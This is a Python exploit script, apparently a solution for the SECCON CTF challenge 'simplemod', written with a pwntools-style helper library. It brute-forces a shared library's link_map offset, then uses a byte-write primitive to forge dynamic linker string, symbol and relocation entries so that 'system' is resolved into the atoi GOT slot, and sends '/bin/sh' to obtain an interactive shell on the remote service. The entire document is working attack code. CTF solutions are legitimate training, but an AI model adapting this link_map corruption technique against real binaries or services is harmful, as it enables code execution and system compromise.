from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'rlocal', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', rlocal = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'set follow-fork-mode parent\nset $map = ((struct link_map*)0x00007ffff7fc7000)'}, \
                        local   = {'argv':[bin_file]}, \
                        rlocal  = {'host':'localhost', 'port':7250}, \
                        remote  = {'host':'simplemod.seccon.games', 'port':7250})
env.select()

#==========

libm = ELF('libmod.so')
ofs_libm_gotplt   = libm.sep_section['.got.plt']
ofs_libm_got_atoi = libm.got['atoi']
ofs_libm_gbuf     = libm.symbols['gbuf']
# ofs_libm_plt_scf  = libm.plt['__stack_chk_fail']
ofs_libm_call_scf = 0x1263

elf64_sym  = struct.Struct("<LBBHQQ")
elf64_rela = struct.Struct("<QQq")

#==========

def attack(conn, rep_argl, ofs_map, **kwargs):
    ofs_m2c = rep_argl[0]

    sm = SimpleMod(conn)
    libm_map = LinkMap(ofs_map)
    libc_map = LinkMap(ofs_map + ofs_m2c)

    sm.char(libc_map.l_addr, 0x1b)

    ofs_gbuf = ofs_libm_gbuf - ofs_libm_gotplt
    new_ent = 13

    sm.char(libm_map.l_info['DT_STRTAB'], 0xd8) # .got.plt (DT_PLTGOT)
    sm.data(0, b'exit_imm\x00system\x00')

    sm.char(libm_map.l_info['DT_SYMTAB'], 0xd8)
    sm.data(elf64_sym.size*9-ofs_gbuf, elf64_sym.pack(ofs_gbuf, 0x12, 0, 0xe, ofs_libm_call_scf, 0x00)) # exit_imm -> stack_chk_fail
    sm.data(elf64_sym.size*new_ent-ofs_gbuf, elf64_sym.pack(ofs_gbuf+9, 0x12, 0, 0x0, 0, 0x0))          # new entry for system

    sm.char(libm_map.l_info['DT_JMPREL'], 0xe0) # gbuf
    sm.data(elf64_rela.size*1,  elf64_rela.pack(ofs_libm_got_atoi, (new_ent<<32) | 7, 0))               # resolve stack_chk_fail (system+0x1b) -> GOT[atoi]

    sm.exit()

    conn.sendlineafter(b'> ', b'/bin/sh')

def check_linkmap(conn, rep_argl, prog=None, **kwargs):
    ofs = rep_argl[0]
    if prog is not None:
        prog.status('0x{:04x}'.format(ofs))

    sm = SimpleMod(conn)
    libm_map = LinkMap(ofs)

    sm.char(libm_map.l_addr, 0x19)
    sm.exit()

    conn.recvuntil(b'MENU')

class SimpleMod:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def char(self, offset, v):
        self.sendlineafter(b'> ', b'1')
        self.sendlineafter(b'offset: ', str(offset).encode())
        self.sendlineafter(b'value: ', str(v).encode())

    def data(self, offset, data):
        for i, num in enumerate(data):
            if num == 0:
                continue
            self.char(offset+i, num)

    def exit(self):
        self.sendlineafter(b'> ', b'0')

class LinkMap:
    def __init__(self, addr):
        info_tag = {'DT_STRTAB':5, 'DT_SYMTAB':6, 'DT_JMPREL':23}

        self.l_addr        = addr
        self.l_info        = { k: addr+0x40+8*v for (k,v) in info_tag.items() }

#==========

def main():
    if env.check(['debug', 'local']):
        os.environ['LD_LIBRARY_PATH'] = '.'

    comn = Communicate(env.mode, **env.target)

    comn.quiet = True
    comn.connect()
    ofs_map = (list(comn.repeat(check_linkmap, True, [0xf80, 0x10b0, 0x1150, 0x13e0, 0x14e0])) + [None])[0]
    if ofs_map is None:
        with log.progress('Finding map ') as p:
            ofs_map = comn.repeat(check_linkmap, True, range(0xf80, 0x2000, 0x10), prog=p)[0]
    info('libmod link_map offset: 0x{:04x}'.format(ofs_map))

    comn.quiet = False
    comn.connect()
    comn.repeat(attack, True, [0x560, 0x570, 0x580, 0x550], ofs_map=ofs_map)

    comn.interactive()

if __name__=='__main__':
    main()

#==========